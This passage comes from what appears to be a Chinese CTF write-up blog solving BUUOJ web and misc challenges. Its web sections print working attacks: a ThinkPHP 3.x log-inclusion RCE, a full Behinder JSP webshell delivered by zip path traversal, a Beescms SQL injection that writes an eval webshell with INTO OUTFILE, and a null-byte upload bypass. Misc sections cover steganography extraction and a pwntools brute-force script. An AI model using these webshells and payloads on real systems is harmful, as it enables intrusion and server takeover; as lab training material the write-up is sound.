class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">写入phpinfo()<br>GET <span class="hljs-regexp">/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/</span><span class="hljs-number">1.1</span><br>Host: c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90.0</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,*/*;q=<span class="hljs-number">0.8</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=<span class="hljs-number">3</span>nctjnqfd39jl28bg59mnaf2b5<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br><br>  <br>查看日志，注意日志时间<br>GET <span class="hljs-regexp">/index.php/</span>?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.<span class="hljs-regexp">/Application/</span>Runtime<span class="hljs-regexp">/Logs/</span>Common/<span class="hljs-number">21</span>_08_02.log<br><br>上shell<br>GET /index.php?m=--&gt;&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;atkx&quot;</span>]);?&gt;<br><br>蚁剑连接：<br>http:<span class="hljs-regexp">//</span>c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<span class="hljs-regexp">/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Common/</span><span class="hljs-number">21</span>_08_02.log<br>pass：atkx<br></code></pre></td></tr></table></figure><p>蚁剑连接成功</p><p>ThinkphpGUI工具getshell</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png" alt="image-20210815121015293"></p><p>相关信息;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">检测漏洞 ThinkPHP <span class="hljs-number">3</span>.x Log RCE中......<br>[+] 存在ThinkPHP <span class="hljs-number">3</span>.x Log RCE<br>Payload: http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log<br>[+] http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log   Pass:peiqi<br></code></pre></td></tr></table></figure><p>蚁剑连接成功</p><h2 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h2><h4 id="jspxcms解压getshell漏洞"><a href="#jspxcms解压getshell漏洞" class="headerlink" title="jspxcms解压getshell漏洞"></a>jspxcms解压getshell漏洞</h4><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/</a></p><p>admin空密码登录后台，进入后台管理页面：/cmscp/index.do找到漏洞存在的功能页面。</p><p>这里用冰蝎自带的马shell.jsp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure><p>生成war，把shell.jsp和jar.exe放至同一目录下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cf <span class="hljs-keyword">shell.war </span>*<br></code></pre></td></tr></table></figure><p>所以选择脚本写入</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import zipfile<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;test.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    temp=f.<span class="hljs-built_in">read</span>()<br><br>z.writestr(<span class="hljs-string">&#x27;../../../shell.war&#x27;</span>,temp)  <span class="hljs-comment">#shell.war为上一步生产的后门war包</span><br>z.<span class="hljs-built_in">close</span>()<br>    <br>      <br>      <br>import zipfile<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>binary=f.<span class="hljs-built_in">read</span>()<br>f.<span class="hljs-built_in">close</span>()<br>binary1 = b<span class="hljs-string">&#x27;123123&#x27;</span><br>zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;tests.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>info = zipfile.ZipInfo(<span class="hljs-string">&quot;tests.zip&quot;</span>)<br>zipFile.writestr(<span class="hljs-string">&quot;../../../shells.war&quot;</span>, binary)<br>zipFile.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>上传生成的test.zip</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png" alt="image-20210815122131241"></p><p>注意解压，然后冰蝎连接</p><p><a href="http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/cmscp/index.do">http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/</a>shell/shell.jsp</p><p>pass：rebeyond</p><h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><h4 id="Beescms-v4-0-sql注入漏洞分析"><a href="#Beescms-v4-0-sql注入漏洞分析" class="headerlink" title="Beescms_v4.0 sql注入漏洞分析"></a>Beescms_v4.0 sql注入漏洞分析</h4><p>后台注入outfile :<a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p><p>/<a href="http://www.zip/">www.zip</a> 下载源码是beescms，/var/www/html/</p><p>sql注入outfile写webshell，过滤了空格，用然/**/代替，后连接webshell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">215</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn/admin/login.php<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=om<span class="hljs-number">10447</span>imss<span class="hljs-number">7</span>jbttdpjm<span class="hljs-number">5</span>lsf<span class="hljs-number">24</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">user</span>=admin&#x27;/**/union/**/selselectect/**/<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">3</span>d<span class="hljs-number">406576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>b<span class="hljs-number">2761746</span>b<span class="hljs-number">78275</span>d<span class="hljs-number">293</span>f<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>/**/into/**/outoutfilefile/**/&#x27;/var/www/html/atkx.php&#x27;#&amp;password=<span class="hljs-number">123456</span>&amp;code=&amp;submit=true&amp;submit.x=<span class="hljs-number">47</span>&amp;submit.y=-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>蚁剑连接成功getflag </p><h2 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h2><p>00截断</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /qbl.php?id=<span class="hljs-number">1</span>.php%<span class="hljs-number">0012312312321321</span>&amp;url=http://baidu.com HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: https://hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span>/sc.php?id=<span class="hljs-number">12312312321321</span>&amp;url=http://baidu.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">86</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">img</span>=data%<span class="hljs-number">3</span>Aimage%<span class="hljs-number">2</span>Fpng%<span class="hljs-number">3</span>Bbase<span class="hljs-number">64</span>%<span class="hljs-number">2</span>CR<span class="hljs-number">0</span>lGODk<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocApwaHBpbmZvKCk<span class="hljs-number">7</span>CkBldmFsKCRfUE<span class="hljs-number">9</span>TVFsxXSk<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs maxima">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg -E <span class="hljs-string">&quot;b1,g,lsb,xy&quot;</span> ezSteganography-flag.png &gt; out.png<br><br><br><br>First <span class="hljs-built_in">part</span> of flag <span class="hljs-built_in">is</span>:flag&#123;2e9ec6480d0515<br>QIM quantization <span class="hljs-built_in">is</span> useful to <span class="hljs-built_in">get</span> another flag.<span class="hljs-keyword">step</span> <span class="hljs-built_in">is</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>QIM量化</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> <span class="hljs-type">Image</span><br><span class="hljs-keyword">from</span> <span class="hljs-type">Crypto</span>.<span class="hljs-type">Util</span> <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>def extract(delta,y):<br><span class="hljs-keyword">out</span>=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (delta/<span class="hljs-number">2</span>-y%delta):<br><span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br><span class="hljs-keyword">out</span>.append(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">out</span>.append(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">out</span>=np.<span class="hljs-built_in">array</span>(<span class="hljs-keyword">out</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><br><br>p=np.<span class="hljs-built_in">array</span>(<span class="hljs-type">Image</span>.open(&#x27;ezSteganography-flag.png&#x27;))<br>R,G,B=p[:,:,<span class="hljs-number">0</span>],p[:,:,<span class="hljs-number">1</span>],p[:,:,<span class="hljs-number">2</span>]<br>G=G.ravel()<br><br>te_out=extract(<span class="hljs-number">20</span>,G)<br>plt.imshow(np.<span class="hljs-built_in">array</span>(te_out).reshape(<span class="hljs-number">1440</span>,<span class="hljs-number">2560</span>))<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到另一半flag</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png" alt="image-20210815122241546"></p><h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *       <span class="hljs-comment">#需要用到pwntools模块</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25900</span>)        <span class="hljs-comment">#连接，相当于nc，注：25900是端口，每一次开靶机基本上都不同</span><br>payload = [<span class="hljs-string">&#x27;r&#x27;</span>] * <span class="hljs-number">66</span>    <span class="hljs-comment">#先把答案设置成66个‘r’</span><br>restart = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> restart:<br>    restart = <span class="hljs-number">0</span>        <span class="hljs-comment">#先把restart改为0，避免死循环</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">66</span>):        <span class="hljs-comment">#循环发送答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:&#x27;</span>)        <span class="hljs-comment">#接收函数，一直接收，直到接收到设定的字符串才进行下一语句</span><br>        io.sendline(payload[i])        <span class="hljs-comment">#发送函数，上传第i个答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Team&#x27;</span>)<br>        io.recvuntil(<span class="hljs-string">&quot;Team\n&quot;</span>)        <span class="hljs-comment">#因为输入一个答案后会有两个&#x27;Team&#x27;的字符串，所以接收两个‘Team&#x27;后进行下一语句</span><br>        p = io.recv(<span class="hljs-number">10</span>)        <span class="hljs-comment">#接收函数，可控制接收的字符数量，这里接收10个字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The number&#x27;</span> in p:        <br>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment">#接收到&#x27;The number&#x27;则说明这个答案对了，继续进行下一个for语句发送下一个答案</span><br>        <span class="hljs-keyword">else</span>:<br>            io.recvuntil(<span class="hljs-string">&#x27;Play again? (y/n): &#x27;</span>)         <span class="hljs-comment">#如果没有接收到&#x27;The number&#x27;,则第i个答案错误，接收完字符</span><br>            payload[i] = <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-comment">#将第i个答案改正</span><br>            io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)        <span class="hljs-comment">#发送‘y’重新游戏</span><br>            restart = <span class="hljs-number">1</span>         <span class="hljs-comment">#将restart改为1，将会重新while循环</span><br>            <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 <span class="hljs-built_in">exp</span>.py                                                                         <br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    <span class="hljs-keyword">To</span> disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache<span class="hljs-number">-3.9</span>/update <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    <span class="hljs-literal">Or</span> add the following lines <span class="hljs-keyword">to</span> ~/.pwn.conf <span class="hljs-literal">or</span> ~/.config/pwn.conf (<span class="hljs-literal">or</span> /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] A newer version of pwntools is available on pypi (<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>.dev0 --&gt; <span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0).<br>    Update <span class="hljs-keyword">with</span>: $ pip install -U pwntools==<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0<br>[+] Opening connection <span class="hljs-keyword">to</span> node4.buuoj.cn on port <span class="hljs-number">25868</span>: Done<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">14</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">16</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(list[i])<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">0</span><br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">33</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">28</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">1</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">3</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">4</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">9</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">10</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">12</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">13</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">18</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">20</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">22</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">24</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">26</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">28</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">29</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">31</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">32</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">33</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">35</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">38</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">39</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">40</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">41</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">44</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">45</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">46</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">48</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">50</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">53</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">54</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">55</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span 